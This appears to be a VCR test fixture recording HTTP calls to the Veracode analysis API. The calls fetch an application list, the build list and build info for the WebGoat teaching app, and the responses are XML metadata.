        <application app_id="32338" app_name="WebGoat" description="WebGoat is a teaching
        web application illustrating common web vulnerabilities." business_criticality="Very
        High" policy="Veracode Transitional Very High" teams="" origin="Open Source"
        industry_vertical="Other" app_type="Other" deployment_method="Not Specified"
        is_web_application="true" modified_date="2012-03-01T10:03:59-05:00" cots="false"
        business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        </application>

        </appinfo>

'
    http_version: 
  recorded_at: Fri, 28 Dec 2012 01:19:47 GMT
- request:
    method: get
    uri: https://test:test@analysiscenter.veracode.com/api/4.0/getapplist.do
    body:
      encoding: US-ASCII
      string: ''
    headers: {}
  response:
    status:
      code: 200
      message: OK
    headers:
      Pragma:
      - ''
      Cache-Control:
      - no-store private must-revalidate
      Expires:
      - Thu, 01 Jan 1970 00:00:00 GMT
      Set-Cookie:
      - JSESSIONID=1EE0A29377623DFBE6BA6A3436F2394A; Path=/; Secure
      - JSESSIONID=6F94C2819AD0611429D8A0EEC828248C; Path=/; Secure
      Content-Type:
      - text/xml
      Transfer-Encoding:
      - chunked
      Date:
      - Fri, 28 Dec 2012 01:19:48 GMT
      Server:
      - Apache
    body:
      encoding: US-ASCII
      string: ! '<?xml version="1.0" encoding="UTF-8"?>


        <applist xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="https://analysiscenter.veracode.com/schema/2.0/applist"
        xsi:schemaLocation="https://analysiscenter.veracode.com/schema/2.0/applist
        https://analysiscenter.veracode.com/resource/2.0/applist.xsd" account_id="15834">

        <app app_id="33715" app_name="Ajax-Login"/>

        <app app_id="32346" app_name="Apache"/>

        <app app_id="41311" app_name="Auth Service"/>

        <app app_id="32344" app_name="BlogEngine.NET"/>

        <app app_id="32347" app_name="Galleon"/>

        <app app_id="32333" app_name="Hadoop"/>

        <app app_id="32345" app_name="HSQLdb"/>

        <app app_id="33136" app_name="iGoat"/>

        <app app_id="32343" app_name="iOS Traveler"/>

        <app app_id="32342" app_name="Lunar Lander"/>

        <app app_id="32335" app_name="Metamail"/>

        <app app_id="32339" app_name="midpssh-BB"/>

        <app app_id="32336" app_name="Open SSH"/>

        <app app_id="35247" app_name="Open Web Analytics"/>

        <app app_id="40775" app_name="Pastie"/>

        <app app_id="32363" app_name="PHP Vulnerable Web App (Test)"/>

        <app app_id="32721" app_name="PHP Vulnerable Web App (Test2)"/>

        <app app_id="32341" app_name="phpBB"/>

        <app app_id="32337" app_name="Roller"/>

        <app app_id="36862" app_name="Test Application"/>

        <app app_id="36863" app_name="Test Application 3"/>

        <app app_id="36914" app_name="Test Application 4"/>

        <app app_id="32491" app_name="TEst C App"/>

        <app app_id="32503" app_name="Test C App Preflight"/>

        <app app_id="37693" app_name="VOSAO"/>

        <app app_id="32338" app_name="WebGoat"/>

        </applist>

'
    http_version: 
  recorded_at: Fri, 28 Dec 2012 01:19:48 GMT
- request:
    method: get
    uri: https://test:test@analysiscenter.veracode.com/api/4.0/getbuildinfo.do?app_id=32338&build_id=44905
    body:
      encoding: US-ASCII
      string: ''
    headers: {}
  response:
    status:
      code: 200
      message: OK
    headers:
      Pragma:
      - ''
      Cache-Control:
      - no-store private must-revalidate
      Expires:
      - Thu, 01 Jan 1970 00:00:00 GMT
      Set-Cookie:
      - JSESSIONID=DDCD093388D21E239C7B1E1A6773DCC4; Path=/; Secure
      - JSESSIONID=FF43022D2935BBD32589AC39193FFECA; Path=/; Secure
      Content-Type:
      - text/xml
      Transfer-Encoding:
      - chunked
      Date:
      - Fri, 28 Dec 2012 01:22:14 GMT
      Server:
      - Apache
    body:
      encoding: US-ASCII
      string: ! '<?xml version="1.0" encoding="UTF-8"?>


        <buildinfo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="https://analysiscenter.veracode.com/schema/4.0/buildinfo"
        xsi:schemaLocation="https://analysiscenter.veracode.com/schema/4.0/buildinfo
        https://analysiscenter.veracode.com/resource/4.0/buildinfo.xsd" account_id="15834"
        app_id="32338" build_id="44905">

        <build version="5.0" build_id="44905" submitter="Veracode" platform="Java"
        lifecycle_stage="External or Beta Testing" results_ready="true" policy_name="Veracode
        Transitional Very High" policy_version="1" policy_compliance_status="Did Not
        Pass" rules_status="Did Not Pass" grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" published_date="2012-03-01T09:26:18-05:00"
        published_date_sec="1330611978" status="Results Ready"/>

        <analysis_unit analysis_type="Dynamic" published_date="2012-03-01T10:03:50-05:00"
        published_date_sec="1330614230" status="Results Ready"/>

        <analysis_unit analysis_type="Manual" published_date="2012-03-01T09:59:14-05:00"
        published_date_sec="1330613954" status="Results Ready"/>

        </build>

        </buildinfo>

'
    http_version: 
  recorded_at: Fri, 28 Dec 2012 01:22:14 GMT
- request:
    method: get
    uri: https://test:test@analysiscenter.veracode.com/api/4.0/getbuildlist.do?app_id=32338
    body:
      encoding: US-ASCII
      string: ''
    headers: {}
  response:
    status:
      code: 200
      message: OK
    headers:
      Pragma:
      - ''
      Cache-Control:
      - no-store private must-revalidate
      Expires:
      - Thu, 01 Jan 1970 00:00:00 GMT
      Set-Cookie:
      - JSESSIONID=57162CBB9652D68F2C92C8CB474F6BD1; Path=/; Secure
      - JSESSIONID=60B5BAE3476DA4F272679F8BD560E6DD; Path=/; Secure
      Content-Type:
      - text/xml
      Transfer-Encoding:
      - chunked
      Date:
      - Fri, 28 Dec 2012 13:00:22 GMT
      Server:
      - Apache
    body:
      encoding: US-ASCII
      string: ! '<?xml version="1.0" encoding="UTF-8"?>


        <buildlist xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="https://analysiscenter.veracode.com/schema/2.0/buildlist"
        xsi:schemaLocation="https://analysiscenter.veracode.com/schema/2.0/buildlist
        https://analysiscenter.veracode.com/resource/2.0/buildlist.xsd" account_id="15834"
        app_id="32338" app_name="WebGoat">

        <build build_id="44905" version="5.0"/>

        </buildlist>

'
    http_version: 
  recorded_at: Fri, 28 Dec 2012 13:00:22 GMT
recorded_with: VCR 2.2.0
